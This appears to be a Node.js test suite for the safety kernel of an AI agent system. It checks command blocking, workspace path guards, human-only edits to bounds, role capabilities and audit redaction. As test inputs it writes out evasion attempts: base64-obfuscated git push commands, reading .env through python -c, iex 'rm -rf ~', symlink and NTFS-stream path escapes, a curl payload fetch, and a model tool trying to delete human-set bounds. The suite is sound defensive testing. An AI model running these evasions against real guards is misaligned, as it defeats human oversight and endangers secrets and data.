#!/usr/bin/env node
/**
 * Self-contained v1.4.0 Safety Kernel, Role/Capabilities, Restrict-Only Policy Plugin,
 * and Persistent TaskLedger Gate Suite (`verify-v140-safety-gate.mjs`).
 *
 * Covers S1-S7 in completely isolated temporary directories:
 *   S1. v1.4.0 version alignment, `pkg/safety/` 8-module isolation & `package.json` files whitelist, 0 cycles, 6/67/42 facades
 *   S2. Compound command splitting (`&&`, `||`, `|`, `;`, `cmd /c`, `powershell -c`) & inline script (`node -e`, `python -c`) evasion + zero false positives
 *   S3. Path guard matrix (workspace escape, sibling prefix collision, symlink/junction traversal, Windows reserved names, NTFS ADS, `run_command.cwd` escape)
 *   S4. `bounds.*` human-confirmation write authentication (model tool hard-blocked + audited; UI `/action`, `bounds.propose`, and suggestion approval succeed)
 *   S5. `role + capabilities` 4-tier matrix (`assistant` frictionless chief-system ops vs workspace/relay isolation) & `capabilityScope` anti-reuse lock
 *   S6. Restrict-only `Policy Plugin` matrix (valid tightenings enforce & downgrade L3 -> popup; weakening/function/5th-role plugins rejected & audited)
 *   S7. Persistent `TaskLedger` lifecycle, cold-start crash recovery (`resuming`/`running` -> `interrupted`), expiry (`expired`), and `chief-audit.jsonl` redaction/fields
 */
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { Readable } from 'node:stream'
import { fileURLToPath, pathToFileURL } from 'node:url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const PKG = path.resolve(__dirname, '..')

const tmpHome = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-chief-v140-home-'))
const tmpBase = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-chief-v140-wsbase-'))
const tmpWs = path.join(tmpBase, 'project')
const tmpSiblingWs = path.join(tmpBase, 'project-other')
const tmpOutside = path.join(tmpBase, 'outside-secret')
fs.mkdirSync(tmpWs, { recursive: true })
fs.mkdirSync(tmpSiblingWs, { recursive: true })
fs.mkdirSync(tmpOutside, { recursive: true })
fs.mkdirSync(path.join(tmpWs, 'src'), { recursive: true })
fs.mkdirSync(path.join(tmpWs, 'config'), { recursive: true })
fs.writeFileSync(path.join(tmpWs, 'src', 'index.js'), 'export const x = 1\n', 'utf8')
fs.writeFileSync(path.join(tmpOutside, 'secret.txt'), 'OUTSIDE_SECRET', 'utf8')

process.env.DSH_HOME = tmpHome
process.env.DSH_CHIEF_DATA_DIR = path.join(tmpHome, 'notebook')

function parseLocalSpecs(filePath) {
  const src = fs.readFileSync(filePath, 'utf8')
  const deps = new Set()
  const re = /(?:^|\n)\s*(?:import|export)\s+(?:[\s\S]*?\s+from\s+)?['"](\.[^'"]+)['"]/g
  let m
  while ((m = re.exec(src)) !== null) {
    deps.add(m[1])
  }
  return { src, deps: [...deps] }
}

function checkCycles(graph, label) {
  const state = new Map()
  const dfs = (node, stack) => {
    const st = state.get(node) || 0
    assert.notEqual(st, 1, `Circular dependency in ${label}: ${[...stack, node].join(' -> ')}`)
    if (st === 2) return
    state.set(node, 1)
    for (const nxt of (graph.get(node) || [])) dfs(nxt, [...stack, node])
    state.set(node, 2)
  }
  for (const k of graph.keys()) dfs(k, [])
}

try {
  const pkgJson = JSON.parse(fs.readFileSync(path.join(PKG, 'package.json'), 'utf8'))
  const indexMod = await import(pathToFileURL(path.join(PKG, 'index.js')).href)
  const chiefMod = await import(pathToFileURL(path.join(PKG, 'chief.js')).href)
  const archivesMod = await import(pathToFileURL(path.join(PKG, 'archives.js')).href)
  const execMod = await import(pathToFileURL(path.join(PKG, 'chief-executor.js')).href)
  const safetyMod = await import(pathToFileURL(path.join(PKG, 'safety', 'index.js')).href)
  const stateMod = await import(pathToFileURL(path.join(PKG, 'chief-state.js')).href)
  const schemaMod = await import(pathToFileURL(path.join(PKG, 'board-schema.js')).href)
  const storeMod = await import(pathToFileURL(path.join(PKG, 'board-store.js')).href)
  const actionsMod = await import(pathToFileURL(path.join(PKG, 'board-actions.js')).href)
  const routesMod = await import(pathToFileURL(path.join(PKG, 'api-routes.js')).href)
  const toolsMod = await import(pathToFileURL(path.join(PKG, 'model-tools.js')).href)
  const constMod = await import(pathToFileURL(path.join(PKG, 'src', 'client', 'constants.js')).href)

  function makeTestDeps(boardDir, { callLlmOverride } = {}) {
    const fakeHostState = {
      activeRuntime: null,
      activeLlm: null,
      activeAutoContinue: null,
      autoSteeredTurns: new Set(),
      subagentRootMap: new Map(),
      subagentTreeCache: new Map(),
      modelWindowCache: new Map(),
      handoffSeq: 0,
    }
    const deps = {
      hostState: fakeHostState,
      resolveRootSessionId: sid => String(sid || '').trim() || 'global',
      getSessionCwd: () => tmpWs,
      resolveWorkspaceIdForSession: () => 'ws-v140-gate',
      boardFile: () => path.join(boardDir, 'board.json'),
      boardFileFor: sid => path.join(boardDir, `${String(sid || 'global').replace(/[^\w-]/g, '')}.json`),
      sharedBoardFile: () => path.join(boardDir, 'board.json'),
      sessionName: () => 'test-v140',
      getLlm: () => null,
      getAttachments: () => null,
      runtime: { get: () => null },
      callLlmOverride,
      appendBoardLog: () => {},
      agentOf: () => 'lead',
      fetchTeamTasks: () => [],
      listSubagents: () => [],
      refreshSubagentTree: async (_rt, rid) => [{ id: rid || 'global', name: 'lead', status: 'idle' }],
      resolveAgentIdentity: (_rt, sid) => ({ self: 'lead', isChild: false, rootId: sid }),
      resolveEffectiveHandoff: () => ({ text: '', autoText: '' }),
      executeSubagentAction: async () => ({ ok: false }),
      isInternalProfileCwd: () => false,
      readPending: () => null,
      writePending: () => {},
      clearPending: () => {},
      readPendingDeploy: () => null,
      writePendingDeploy: () => {},
      clearPendingDeploy: () => {},
      resolveBoundRootSid: sid => String(sid || '').trim() || '',
      makeChiefDeps: () => deps,
    }
    Object.assign(deps, storeMod.createBoardStore(deps))
    deps.boardFile = () => path.join(boardDir, 'board.json')
    deps.boardFileFor = sid => path.join(boardDir, `${String(sid || 'global').replace(/[^\w-]/g, '')}.json`)
    deps.sharedBoardFile = () => path.join(boardDir, 'board.json')
    Object.assign(deps, actionsMod.createBoardActions(deps))
    return deps
  }

  // -------------------------------------------------------------------------
  // S1. Safety Kernel Structure, Version Alignment, Files Whitelist, Acyclic
  // -------------------------------------------------------------------------
  assert.match(String(pkgJson.version || ''), /^1\.[4-9]\.\d+/, 'package.json version must be >= 1.4.0')
  assert.equal(schemaMod.BACKEND_BUILD, pkgJson.version, 'BACKEND_BUILD must align with package.json version')
  assert.equal(constMod.EXPECTED_BACKEND_BUILD, pkgJson.version, 'EXPECTED_BACKEND_BUILD must align with package.json version')
  assert.ok(Array.isArray(pkgJson.files) && pkgJson.files.includes('safety/*.js'), 'package.json files must include safety/*.js')

  const expectedSafetyFiles = [
    'audit-log.js',
    'command-analyzer.js',
    'guard-walls.js',
    'index.js',
    'invariant-guards.js',
    'path-guard.js',
    'policy-engine.js',
    'policy-plugin.js',
    'tool-gate.js',
  ]
  const actualSafetyFiles = fs.readdirSync(path.join(PKG, 'safety')).filter(f => f.endsWith('.js')).sort()
  assert.deepEqual(actualSafetyFiles, expectedSafetyFiles, 'pkg/safety/ must contain exact 9 modules')

  const safetyGraph = new Map()
  for (const sf of actualSafetyFiles) {
    const full = path.join(PKG, 'safety', sf)
    const { src, deps } = parseLocalSpecs(full)
    assert.equal(/^export\s+(?:let|var)\s+[A-Za-z0-9_$]+/m.test(src), false, `Mutable export forbidden in safety/${sf}`)
    assert.equal(/(?:from|import\s*\(|require\s*\()\s*['"](?:node:)?child_process['"]/.test(src), false, `safety/${sf} must never import child_process`)
    for (const d of deps) {
      const target = path.relative(PKG, path.resolve(path.dirname(full), d)).replace(/\\/g, '/')
      assert.ok(target.startsWith('safety/'), `safety/${sf} must not depend on non-safety module: ${d}`)
    }
    safetyGraph.set(`safety/${sf}`, deps.map(d => `safety/${d.replace(/^\.\//, '')}`))
  }
  checkCycles(safetyGraph, 'safety-kernel')

  assert.equal(Object.keys(indexMod).length, 6)
  assert.equal(Object.keys(chiefMod).length, 67)
  assert.equal(Object.keys(archivesMod).length, 42)
  assert.equal(execMod.normalizePermissionMode.length, 1)
  console.log('✓ S1 passed: v1.4.0 version sync, 9 safety kernel modules isolated & acyclic, 6/67/42 facades preserved')

  // -------------------------------------------------------------------------
  // S2. Compound Pipeline Splitting & Inline Script Red-Team Matrix (+ 0 FP)
  // -------------------------------------------------------------------------
  const boardPush = { bounds: { forbidden: ['禁止 git push', '禁止 npm publish'] } }

  // Compound commands & nested shells
  assert.equal(safetyMod.checkForbiddenBounds(boardPush, 'run_command', 'echo safe && git push origin main').blocked, true, '&& compound git push must block')
  assert.equal(safetyMod.checkForbiddenBounds(boardPush, 'run_command', 'echo ok || npm publish --tag latest').blocked, true, '|| compound npm publish must block')
  assert.equal(safetyMod.checkForbiddenBounds(boardPush, 'run_command', 'ls | cat; git -c user.name=x push').blocked, true, '; + pipe + flag insertion must block')
  assert.equal(safetyMod.checkForbiddenBounds(boardPush, 'run_command', 'cmd /c "echo 1 && git push"').blocked, true, 'cmd /c nested compound must block')
  assert.equal(safetyMod.checkForbiddenBounds(boardPush, 'run_command', 'powershell -NoProfile -Command "Write-Host ok; git push"').blocked, true, 'pwsh -Command nested compound must block')

  // Inline scripts (node -e / python -c / Base64 inside inline script / iex)
  assert.equal(
    safetyMod.checkForbiddenBounds(boardPush, 'run_command', `node -e "require('child_process').execSync('git push origin main')"`).blocked,
    true,
    'node -e child_process git push must block',
  )
  const b64GitPush = Buffer.from('git push origin main', 'utf8').toString('base64')
  assert.equal(
    safetyMod.checkForbiddenBounds(boardPush, 'run_command', `node -e "exec(Buffer.from('${b64GitPush}','base64').toString())"`).blocked,
    true,
    'node -e base64-encoded git push must block',
  )
  assert.equal(
    safetyMod.evaluateSafetyGuardHardRules({ command: `python -c "print(open('.env').read())"` }).blocked,
    true,
    'python -c reading .env must block',
  )
  assert.equal(
    safetyMod.evaluateSafetyGuardHardRules({ command: `node -e "fs.readFileSync(Buffer.from('LmVudg==','base64').toString())"` }).blocked,
    true,
    'node -e base64-encoded .env read must block',
  )
  assert.equal(
    safetyMod.evaluateSafetyGuardHardRules({ command: `powershell -Command "iex 'rm -rf ~'"` }).blocked,
    true,
    'iex destructive command must block',
  )

  // Zero false positives on legitimate developer commands
  assert.equal(
    safetyMod.evaluateSafetyGuardHardRules({ command: 'node -e "console.log(process.env.NODE_ENV)"', board: boardPush }).blocked,
    false,
    'node -e reading process.env.NODE_ENV MUST NOT false-positive',
  )
  assert.equal(
    safetyMod.evaluateSafetyGuardHardRules({ command: 'echo $env:TEMP && node --check src/index.js 2>&1', board: boardPush }).blocked,
    false,
    'Legitimate compound check + $env:TEMP MUST NOT false-positive',
  )
  assert.equal(
    safetyMod.evaluateSafetyGuardHardRules({ command: String.raw`node .\env\setup.js`, board: boardPush }).blocked,
    false,
    'Legitimate .\\env\\setup.js MUST NOT false-positive',
  )
  console.log('✓ S2 passed: compound pipeline & inline script bypasses blocked with 0 false positives')

  // -------------------------------------------------------------------------
  // S3. Path Guard Matrix (Workspace Escape, Prefix Collision, Junction, Reserved, ADS)
  // -------------------------------------------------------------------------
  const s3Deps = makeTestDeps(path.join(tmpHome, 'boards-s3'))
  const s3Ctx = { rootId: 's3', cwd: tmpWs, permissionMode: 'chief', hasChiefRiskAck: true, board: {} }

  const escRel = await execMod.executeChiefToolCall(s3Deps, {
    tool: 'write_file',
    args: { path: '../../outside-secret/pwn.txt', content: 'x' },
  }, s3Ctx)
  assert.equal(escRel.blockedBySafetyGuard, true, 'Relative ../../ escape must block even in L3')
  assert.equal(escRel.rule, 'workspace_escape')

  const escSibling = await execMod.executeChiefToolCall(s3Deps, {
    tool: 'write_file',
    args: { path: path.join(tmpSiblingWs, 'pwn.txt'), content: 'x' },
  }, s3Ctx)
  assert.equal(escSibling.blockedBySafetyGuard, true, 'Sibling prefix collision (`project` vs `project-other`) must block')
  assert.equal(escSibling.rule, 'workspace_escape')

  const escRunCwd = await execMod.executeChiefToolCall(s3Deps, {
    tool: 'run_command',
    args: { command: 'echo hi', cwd: '../outside-secret' },
  }, s3Ctx)
  assert.equal(escRunCwd.blockedBySafetyGuard, true, 'run_command cwd escaping workspace must block')
  assert.equal(escRunCwd.rule, 'workspace_escape')

  const reservedRes = await execMod.executeChiefToolCall(s3Deps, {
    tool: 'write_file',
    args: { path: 'NUL.txt', content: 'x' },
  }, s3Ctx)
  assert.equal(reservedRes.blockedBySafetyGuard, true, 'Windows reserved device name NUL.txt must block')
  assert.equal(reservedRes.rule, 'windows_reserved_device')

  const adsRes = await execMod.executeChiefToolCall(s3Deps, {
    tool: 'write_file',
    args: { path: 'notes.txt:hiddenstream', content: 'x' },
  }, s3Ctx)
  assert.equal(adsRes.blockedBySafetyGuard, true, 'NTFS ADS stream path must block')
  assert.equal(adsRes.rule, 'ntfs_ads_stream')

  // Junction / symlink directory traversal check (creating a NEW nonexistent file inside a linked dir)
  const junctionDir = path.join(tmpWs, 'linked-outside')
  let linkCreated = false
  try {
    fs.symlinkSync(tmpOutside, junctionDir, process.platform === 'win32' ? 'junction' : 'dir')
    linkCreated = true
  } catch {}
  if (linkCreated) {
    const juncRes = await execMod.executeChiefToolCall(s3Deps, {
      tool: 'write_file',
      args: { path: path.join('linked-outside', 'nonexistent-sub', 'evil.txt'), content: 'x' },
    }, s3Ctx)
    assert.equal(juncRes.blockedBySafetyGuard, true, 'Writing through symlink/junction to outside dir must block')
    assert.equal(juncRes.rule, 'workspace_escape')
  }
  console.log('✓ S3 passed: workspace escape, sibling prefix collision, junction traversal, reserved device & ADS blocked')

  // -------------------------------------------------------------------------
  // S4. `bounds.*` Human Confirmation Write Auth
  // -------------------------------------------------------------------------
  const s4BoardDir = path.join(tmpHome, 'boards-s4')
  const s4Deps = makeTestDeps(s4BoardDir)
  s4Deps.runtime = {
    get: name => name === 'connection' ? { requestRejection: () => 0 } : null,
  }
  const s4Api = routesMod.createApiRoutes({
    ...s4Deps,
    archiveTarget: () => ({ cwd: tmpWs, vaultScope: 'session', rootSessionId: 's4-sess' }),
    boundaries: () => ({ allowed: [], forbidden: [], notes: [] }),
    collectDigestArchiveContext: () => ({ takenOutArchives: [], sessionArchiveBriefs: [], smartCompactActive: false, chiefPermissionMode: 'advisor' }),
    collectDeskItemsForUi: () => [],
    collectLinkedPeerDigestContext: () => ({ linkedPeersCount: 0, linkedPeersProgress: [] }),
    defaultTargetForSession: () => 'new',
    getSessionContextBreakdown: () => ({}),
    linkedPeersForSession: () => [],
    readPendingDeploy: () => null,
    runtimeHealth: () => ({}),
    transferChief: async () => ({ ok: false }),
    transcriptTimes: () => new Map(),
  })
  const s4Routes = s4Api.routeTable(s4Deps.runtime)
  const actionRoute = s4Routes.find(r => r.path === '/api/dsh-chief/action')
  assert.ok(actionRoute)

  // UI route adds a forbidden bound cleanly (with HUMAN_BOUNDS_CONFIRM_TOKEN)
  const uiReq = Readable.from([Buffer.from(JSON.stringify({
    action: 'bounds.add',
    field: 'forbidden',
    item: '严禁触碰生产库',
    session: 's4-sess',
    by: 'operator',
  }), 'utf8')])
  uiReq.url = '/api/dsh-chief/action'
  uiReq.method = 'POST'
  uiReq.headers = { host: '127.0.0.1' }
  let uiRaw = ''
  await actionRoute.handler(uiReq, { statusCode: 0, setHeader() {}, end(t) { uiRaw = String(t) } })
  assert.equal(JSON.parse(uiRaw).ok, true, 'Human UI bounds.add must succeed')

  // Model tool attempting direct bounds.remove or bounds.set MUST be blocked + audited
  const boardTool = toolsMod.createModelTools(s4Deps).boardTool(s4Deps.runtime)
  const modelRemove = await boardTool.execute({
    action: 'bounds.remove',
    field: 'forbidden',
    item: '严禁触碰生产库',
    session: 's4-sess',
  }, { agent: { id: 's4-sess' } })
  assert.equal(modelRemove.ok, false, 'Model tool MUST NOT remove bounds directly')
  assert.match(modelRemove.error, /bounds\.propose|安全卫兵/, 'Error must direct model to bounds.propose')

  const modelSet = await boardTool.execute({
    action: 'bounds.set',
    field: 'forbidden',
    items: [],
    session: 's4-sess',
  }, { agent: { id: 's4-sess' } })
  assert.equal(modelSet.ok, false, 'Model tool MUST NOT overwrite bounds directly')
  const boardAfterModel = s4Deps.boardForSession(s4Deps.boardFileFor('s4-sess'))
  assert.deepEqual(boardAfterModel.bounds.forbidden, ['严禁触碰生产库'], 'Forbidden bound must remain intact after model tampering attempt')

  // Model tool calling bounds.propose -> user approves suggestion -> succeeds
  const propOut = await boardTool.execute({
    action: 'bounds.propose',
    field: 'allowed',
    item: '改动前跑单测',
    reason: '保障质量',
    session: 's4-sess',
  }, { agent: { id: 's4-sess' } })
  assert.equal(propOut.ok, true, 'Model bounds.propose must succeed')
  const pendingSugs = stateMod.loadChiefState({ forceDisk: true }).workspaces['s4-sess'].suggestions
  const sugRes = await chiefMod.handleSuggestionDecision(s4Deps, {
    sessionId: 's4-sess',
    suggestionId: pendingSugs[0].id,
    decision: 'approve',
  })
  assert.equal(sugRes.ok, true, 'Approving bound suggestion must write via human_approval token')
  assert.ok(s4Deps.boardForSession(s4Deps.boardFileFor('s4-sess')).bounds.allowed.includes('改动前跑单测'))
  console.log('✓ S4 passed: bounds.* human confirmation guard blocks direct model mutations & allows UI / approved proposals')

  // -------------------------------------------------------------------------
  // S5. `role + capabilities` Matrix (`assistant` frictionless vs isolation) & `capabilityScope`
  // -------------------------------------------------------------------------
  const capL0 = safetyMod.resolveRoleCapabilities('advisor')
  const capL1 = safetyMod.resolveRoleCapabilities('assistant')
  const capL2 = safetyMod.resolveRoleCapabilities('strategist')
  const capL3Unacked = safetyMod.resolveRoleCapabilities('chief', { hasChiefRiskAck: false })
  const capL3Acked = safetyMod.resolveRoleCapabilities('chief', { hasChiefRiskAck: true })
  assert.equal(capL0.capabilities.allowBoardAdmin, false)
  assert.equal(capL1.capabilities.allowBoardAdmin, true)
  assert.equal(capL1.capabilities.allowArchiveCurate, true)
  assert.equal(capL1.capabilities.allowWorkspaceWrite, 'deny')
  assert.equal(capL1.capabilities.allowMainRelay, 'deny')
  assert.equal(capL2.capabilities.allowWorkspaceWrite, 'approval')
  assert.equal(capL3Unacked.role, 'advisor', 'Unacked chief must fall back to advisor')
  assert.equal(capL3Acked.capabilities.allowWorkspaceWrite, 'allow')

  // L1 assistant: boardOps + memoryChanges succeed without popup, while write_file & relay stay denied
  const sessL1 = 's5-assistant'
  chiefMod.updateChiefConfig({ sessionId: sessL1, permissionMode: 'assistant' })
  const s5Deps = makeTestDeps(path.join(tmpHome, 'boards-s5'), {
    callLlmOverride: async ({ prompt }) => {
      if (prompt.includes('第 1 步实权工具真实执行结果')) {
        return {
          ok: true,
          text: JSON.stringify({
            reply: '已添加任务与纪律记忆，工作区写入与主对话插话均被 L1 策略阻断。',
            memoryChanges: [{ op: 'add', category: 'discipline', text: 'L1 可以自主记下这条规范' }],
            boardOps: [{ op: 'task.add', title: 'L1 自主看板任务' }],
            relays: [{ target: 'lead', mode: 'steer', text: '越权插话主对话' }],
          }),
        }
      }
      return {
        ok: true,
        text: JSON.stringify({
          reply: '尝试写入工作区文件',
          toolCalls: [{ tool: 'write_file', args: { path: 'src/l1-illegal.js', content: 'bad' } }],
        }),
      }
    },
  })
  const l1Out = await chiefMod.askOrCommandChief(s5Deps, {
    sessionId: sessL1,
    text: '记一条规矩、加一个任务，并试试写文件和插话主对话',
  })
  assert.equal(l1Out.ok, true)
  assert.equal(l1Out.pendingApprovals.length, 0, 'L1 assistant must NOT trigger L2 approval popup for board/memory maintenance')
  assert.equal(l1Out.toolRecords[0].result.deniedByMode, true, 'L1 write_file must be denied by mode')
  assert.equal(l1Out.memoryChanges.length, 1, 'L1 assistant must apply memoryChanges without popup')
  assert.equal(l1Out.boardOps.length, 1, 'L1 assistant must apply boardOps without popup')
  assert.equal(l1Out.relays[0].deniedByMode, true, 'L1 assistant MUST NOT relay into main chat')
  assert.equal(fs.existsSync(path.join(tmpWs, 'src', 'l1-illegal.js')), false, 'L1 assistant MUST NOT write workspace file')

  // capabilityScope anti-reuse check: approve write to fileA, then tamper capabilityScope check against fileB
  const scopeA = safetyMod.buildCapabilityScope({
    kind: 'tool',
    tool: 'write_file',
    args: { path: 'src/fileA.js', content: 'A' },
    cwd: tmpWs,
  })
  assert.equal(safetyMod.verifyCapabilityScope(scopeA, {
    kind: 'tool',
    tool: 'write_file',
    args: { path: 'src/fileA.js', content: 'A' },
    cwd: tmpWs,
  }).ok, true)
  const scopeMismatchExec = await execMod.executeChiefToolCall(s5Deps, {
    tool: 'write_file',
    args: { path: 'src/fileB.js', content: 'B' },
  }, {
    rootId: 's5-scope',
    cwd: tmpWs,
    permissionMode: 'strategist',
    approvedOnce: true,
    capabilityScope: scopeA,
    board: {},
  })
  assert.equal(scopeMismatchExec.ok, false)
  assert.equal(scopeMismatchExec.deniedByScopeMismatch, true, 'Single-use approval capabilityScope must reject writing a different path')
  assert.equal(fs.existsSync(path.join(tmpWs, 'src', 'fileB.js')), false)
  console.log('✓ S5 passed: role + capabilities isolation & capabilityScope anti-reuse enforced')

  // -------------------------------------------------------------------------
  // S6. Restrict-Only Policy Plugin Matrix
  // -------------------------------------------------------------------------
  // Reject weakening / function / 5th-role / wildcard prefix plugins
  const badPlugins = [
    { id: 'evil-1', name: 'Evil', rules: { disableHardGuard: true } },
    { id: 'evil-2', name: 'Evil2', allowOutsideWorkspace: true, rules: {} },
    { id: 'evil-3', name: 'Evil3', rules: { maxSubagentRoleCeiling: 'chief' } },
    { id: 'evil-4', name: 'Evil4', rules: { restrictFsWritePrefixes: ['*'] } },
    { id: 'evil-5', name: 'Evil5', rules: { denyTools: ['run_command'] }, hook: () => true },
  ]
  for (const bp of badPlugins) {
    const vRes = safetyMod.validatePolicyPlugin(bp)
    assert.equal(vRes.ok, false, `Weakening/invalid plugin ${bp.id} MUST be rejected`)
    const cfgReject = chiefMod.updateChiefConfig({ sessionId: 's6-plug', policyPlugins: [bp] })
    assert.equal(cfgReject.ok, false, `updateChiefConfig MUST reject unsafe plugin ${bp.id}`)
  }

  // Accept valid restrict-only plugin under L3 chief mode
  const strictPlugin = {
    id: 'prod-lock',
    name: '生产安全锁',
    version: '1.0.0',
    source: 'workspace',
    enabled: true,
    rules: {
      forbidPathPrefixes: ['config'],
      restrictFsWritePrefixes: ['src'],
      forbidCommandPatterns: ['curl\\s+https?:\\/\\/'],
      requireApprovalTools: ['run_command'],
    },
  }
  const cfgAccept = chiefMod.updateChiefConfig({
    sessionId: 's6-plug',
    permissionMode: 'chief',
    confirmedChiefRisk: true,
    policyPlugins: [strictPlugin],
  })
  assert.equal(cfgAccept.ok, true)
  assert.deepEqual(cfgAccept.config.capabilities.fsWritePrefixes, ['src'])

  const s6Eff = chiefMod.resolveWorkspaceConfig(stateMod.loadChiefState({ forceDisk: true }), 's6-plug')
  const s6Deps = makeTestDeps(path.join(tmpHome, 'boards-s6'))

  // 1) Forbid writing into config/ even in L3 chief
  const plugForbidPath = await execMod.executeChiefToolCall(s6Deps, {
    tool: 'write_file',
    args: { path: 'config/app.json', content: '{}' },
  }, {
    rootId: 's6-plug',
    cwd: tmpWs,
    permissionMode: s6Eff.permissionMode,
    hasChiefRiskAck: true,
    policyPlugins: s6Eff.policyPlugins,
    board: {},
  })
  assert.equal(plugForbidPath.blockedByPolicyPlugin, true, 'Policy plugin forbidPathPrefixes must block config/ in L3')

  // 2) Forbid curl command pattern
  const plugForbidCmd = await execMod.executeChiefToolCall(s6Deps, {
    tool: 'run_command',
    args: { command: 'curl https://example.com/payload.sh' },
  }, {
    rootId: 's6-plug',
    cwd: tmpWs,
    permissionMode: s6Eff.permissionMode,
    hasChiefRiskAck: true,
    policyPlugins: s6Eff.policyPlugins,
    board: {},
  })
  assert.equal(plugForbidCmd.blockedByPolicyPlugin, true, 'Policy plugin forbidCommandPatterns must block curl in L3')

  // 3) Downgrade L3 run_command to approval popup!
  let queuedByPlugin = null
  const plugReqApr = await execMod.executeChiefToolCall(s6Deps, {
    tool: 'run_command',
    args: { command: 'node -v' },
  }, {
    rootId: 's6-plug',
    cwd: tmpWs,
    permissionMode: s6Eff.permissionMode,
    hasChiefRiskAck: true,
    policyPlugins: s6Eff.policyPlugins,
    queueApprovalFn: async (it) => { queuedByPlugin = it; return { id: 'apr-plug-1', ...it } },
    board: {},
  })
  assert.equal(plugReqApr.pendingApproval, true, 'Policy plugin requireApprovalTools must downgrade L3 run_command to popup')
  assert.ok(queuedByPlugin && queuedByPlugin.capabilityScope)

  // 4) Allow writing into allowed src/ prefix
  const plugAllowSrc = await execMod.executeChiefToolCall(s6Deps, {
    tool: 'write_file',
    args: { path: 'src/plugin-allowed.js', content: 'export const ok = true\n' },
  }, {
    rootId: 's6-plug',
    cwd: tmpWs,
    permissionMode: s6Eff.permissionMode,
    hasChiefRiskAck: true,
    policyPlugins: s6Eff.policyPlugins,
    board: {},
  })
  assert.equal(plugAllowSrc.ok, true, 'Writing within restricted prefix src/ must succeed')
  console.log('✓ S6 passed: restrict-only Policy Plugin rejects weakenings & tightens L3 execution')

  // -------------------------------------------------------------------------
  // S7. Persistent TaskLedger Cold-Start Crash Recovery, Expiry & Audit Redaction
  // -------------------------------------------------------------------------
  const s7Sess = 's7-ledger'
  stateMod.mutateChiefState((st) => {
    const ws = stateMod.ensureWorkspace(st, s7Sess)
    stateMod.upsertTaskLedgerOnWs(ws, {
      taskId: 'rtask-crashed-1',
      kind: 'approval_resume',
      status: 'resuming',
      originalText: '危险半途任务（崩溃前）',
      expiresAt: Date.now() + 600_000,
    })
    stateMod.upsertTaskLedgerOnWs(ws, {
      taskId: 'rtask-expired-1',
      kind: 'elevation_resume',
      status: 'awaiting_elevation',
      originalText: '超时等待任务',
      expiresAt: Date.now() - 5_000,
    })
  })

  // Simulate process reboot: forceDisk load reconciles stale 'resuming' -> 'interrupted' & past TTL -> 'expired'
  const recoveredState = stateMod.loadChiefState({ forceDisk: true })
  const recoveredLedger = recoveredState.workspaces[s7Sess].taskLedger
  assert.equal(recoveredLedger.find(t => t.taskId === 'rtask-crashed-1').status, 'interrupted', 'Stale resuming task MUST recover safely as interrupted on cold load')
  assert.equal(recoveredLedger.find(t => t.taskId === 'rtask-expired-1').status, 'expired', 'Past-TTL awaiting task MUST mark expired on cold load')

  // Audit secret redaction + stage/rule/durationMs check
  stateMod.appendChiefAuditLog(s7Sess, {
    mode: 'chief',
    stage: 'safety_guard',
    rule: 'forbidden_bound',
    decision: 'blocked',
    operation: 'write_file',
    target: 'secret.txt',
    reason: '发现泄露令牌 sk-secret1234567890abcdef1234 已拦截',
    durationMs: 12,
    outcome: 'blocked',
    by: 'safety_guard',
  })
  const auditFile = chiefMod.auditJsonlPath()
  const rawAuditLines = fs.readFileSync(auditFile, 'utf8').trim().split(/\r?\n/).map(l => JSON.parse(l))
  const s7Row = rawAuditLines.reverse().find(r => r.sessionId === s7Sess && r.rule === 'forbidden_bound')
  assert.ok(s7Row, 'Audit JSONL row must persist')
  assert.equal(s7Row.stage, 'safety_guard')
  assert.equal(s7Row.durationMs, 12)
  assert.equal(s7Row.reason.includes('sk-secret'), false, 'Audit JSONL MUST redact raw secret tokens')
  assert.ok(s7Row.reason.includes('[REDACTED]'), 'Audit JSONL must mask token as [REDACTED]')
  console.log('✓ S7 passed: persistent TaskLedger cold-start crash recovery, expiry & redacted JSONL audit')

  console.log('\nALL 7 V1.4.0 SAFETY GATE CHECKS (S1-S7) PASSED!')
} finally {
  fs.rmSync(tmpHome, { recursive: true, force: true })
  fs.rmSync(tmpBase, { recursive: true, force: true })
}
